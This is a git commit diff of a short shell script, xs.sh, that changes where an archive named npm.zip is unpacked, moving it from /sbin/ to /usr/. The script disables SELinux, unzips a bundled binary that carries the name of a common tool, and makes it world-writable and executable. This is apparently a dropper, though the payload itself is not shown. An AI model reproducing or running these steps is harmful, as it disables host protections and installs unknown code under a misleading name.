5748577701de5ac3e623d098485c5e78746669a5
fuserh <113811989+fuserh@users.noreply.github.com>
2022-09-24 16:27:42 +0800

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,8 +1,8 @@
 sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 sudo apt install unzip -y
-cp npm.zip /sbin/
+cp npm.zip /usr/
 rm npm.zip
-cd /sbin/
+cd /usr/
 unzip npm.zip
 cd npm
 chmod 777 ./npm
